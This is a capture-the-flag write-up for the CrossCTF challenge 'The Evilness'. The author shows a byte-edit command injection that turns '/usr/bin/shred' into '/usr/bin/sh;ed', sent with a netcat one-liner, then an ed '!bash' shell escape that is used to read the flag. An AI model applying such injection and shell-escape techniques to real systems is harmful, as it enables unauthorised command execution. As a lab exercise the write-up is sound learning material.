# The Evilness
Misc - 195 points

## Challenge 

> Ready for something ridiculously difficult?

> nc ctf.pwn.sg 4020


## Solution

Part 1 of the solution is knowing that we can use the `ed` text editor

	/usr/bin/shred

Replace `r` at position 11 with a `;` (0x3b)

	/usr/bin/sh;ed

The payload

	$ printf "11\n3b\n" | nc ctf.pwn.sg 4020
	Here comes the shredder! (/usr/bin/shred /tmp/cartoon-OjdpEr.dat)
	sh: 1: /usr/bin/sh: not found
	Newline appended
	62

---

#### Solved after CTF

I did not manage to solve it during the CTF.

	$ (printf "11\n3b\n"; cat) | nc ctf.pwn.sg 4020

	Here comes the shredder! (/usr/bin/shred /tmp/cartoon-qa1DtW.dat)
	sh: 1: /usr/bin/sh: not found
	Newline appended
	62

By entering a dot, we get the following message.

	.
	LOL YOU THOUGHT THIS WOULD BE SO EASY? GET A SHELL YOU DWEEB.

Hence, part 2 of the solution is knowing that the shell can be launched from ed.

	!bash
	ls
		flag
		flag.py
		requirements.txt
		theevilness.py
	cat flag
		CrossCTF{it5_th3_r34ln3ss_th3_r3alness}
	
## Flag

	CrossCTF{it5_th3_r34ln3ss_th3_r3alness}